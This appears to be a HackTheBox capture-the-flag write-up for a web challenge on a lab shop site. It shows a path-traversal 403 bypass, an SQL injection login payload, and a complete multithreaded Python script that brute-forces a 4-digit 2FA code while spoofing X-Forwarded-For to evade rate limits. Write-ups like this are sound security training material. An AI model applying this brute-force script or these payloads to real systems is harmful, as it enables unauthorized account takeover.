---
title: No Threshold
tags:
  - HackTheBox
  - Challenge
  - Web
  - 403_Bypass
  - SQLi
  - Python-Scripting
---
![](Pasted%20image%2020241122112333.png)

It seems to be kinda shop. If I try to login I get a Forbidden error:

![](Pasted%20image%2020241122112404.png)

I have to bypass this, so I captured the request with Burp:

![](Pasted%20image%2020241122112445.png)

> With `/../auth/login` I can bypass it :D

![](Pasted%20image%2020241122112522.png)

If we read the `entrypoint.sh` we notice that there is a random user created, so might be a SQLi vulnerability on the login:

![](Pasted%20image%2020241122112746.png)

I captured the request and try some SQLis:

![](Pasted%20image%2020241122113207.png)

It actually worked with `admin' OR 1=1 -- -` (URL encoded) :D

Now I got into a 2FA panel verification:

![](Pasted%20image%2020241122113324.png)

Inspecting the source code, I noticed that the 2FA code has 4 digits, so I can try to bruteforce it:

![](Pasted%20image%2020241122113530.png)

So I decided to create a python script to bruteforce it:

```python
import requests
import sys
import argparse
from concurrent.futures import ThreadPoolExecutor

# Colores para las impresiones
GREEN = '\033[92m'
BLUE = '\033[94m'
RED = '\033[91m'
RESET = '\033[0m'

def get_combinations_in_array(path):
    with open(path, 'r') as f:
        return f.read().splitlines()


def handle_response(response, combination):
    if "Invalid 2FA Code!" in response.text:
        # Mostrar intentos en verde
        print(f'{GREEN}Try: {combination}{RESET}\n')
        return
    elif "flag" in response.text:
        # Mostrar flag en azul
        print(f'{BLUE}GOT IT!\n2FA Code: {combination}\n{response.text}{RESET}\n')
        sys.exit()
    else:
        # Mostrar errores en rojo
        print(f'{RED}{response.text}{RESET}')


def send_request(ip, combination, headers, url):
    headers['X-Forwarded-For'] = ip
    data = {'2fa-code': str(combination)}

    response = requests.post(url, headers=headers, data=data)
    handle_response(response, combination)


def send_all_requests(url, combinations_array, ip_suffix):
    base_ip = '192.168.'
    current_ip_suffix = list(map(int, ip_suffix.split('.')))  # Convertir a lista de enteros
    headers = {
        'Host': '83.136.254.158:36141',
        'Content-Length': '13',
        'Cache-Control': 'max-age=0',
        'Origin': 'http://83.136.254.158:36141',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Sec-GPC': '1',
        'Accept-Language': 'en-US,en',
        'Referer': 'http://83.136.254.158:36141/auth/verify-2fa',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive'
    }

    # Multi-threading requests sending (see python ThreadPoolExecutor lib for more information)
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = []

        for i, combination in enumerate(combinations_array, start=1):
            ip = base_ip + str(current_ip_suffix[0]) + '.' + str(current_ip_suffix[1])

            future = executor.submit(send_request, ip, combination, headers, url)
            futures.append(future)

            if i % 5 == 0:
                current_ip_suffix[1] += 1

            if current_ip_suffix[1] > 254:
                current_ip_suffix[1] = 1
                current_ip_suffix[0] += 1

            if current_ip_suffix[0] > 254:
                current_ip_suffix = [1, 1]

            for future in futures:
                future.result()


def parse_arguments():
    parser = argparse.ArgumentParser(description="Brute force 2FA codes to find the flag.")
    parser.add_argument('--target', type=str, required=True, help='The target URL (e.g., http://example.com)')
    parser.add_argument('--combinations', type=str, required=True, help='Path to the file containing the list of 2FA combinations')
    parser.add_argument('--ip-suffix', type=str, required=True, help='The IP suffix to use for requests (e.g., 1.1)')

    return parser.parse_args()


if __name__ == '__main__':
    args = parse_arguments()

    combinations_array = get_combinations_in_array(args.combinations)
    send_all_requests(args.target, combinations_array, args.ip_suffix)

```


>[!Note]
>Since the 2fa code valid time is 5 mins, I'm splitting the wordlist into 5 wordlists of 2000 words each

![](Pasted%20image%2020241122170553.png)

I created the wordlists with the following commands:

```shell
seq -w 0000 2000 > 0k2k-digit-wordlist.txt
seq -w 2001 4000 > 2k4k-digit-wordlist.txt
seq -w 4001 6000 > 4k6k-digit-wordlist.txt
seq -w 6001 8000 > 6k8k-digit-wordlist.txt
seq -w 8001 9999 > 8k10k-digit-wordlist.txt

# Then open a console for each one like:
python x.py --target http://83.136.254.158:36141/auth/verify-2fa --combinations ./4k6k-digit-wordlist.txt  --ip-suffix 13.1
```

I executed different intervals at same time:

![](Pasted%20image%2020241122171242.png)

> Finally got it :D

![](Pasted%20image%2020241122171427.png)

==Challenge completed!==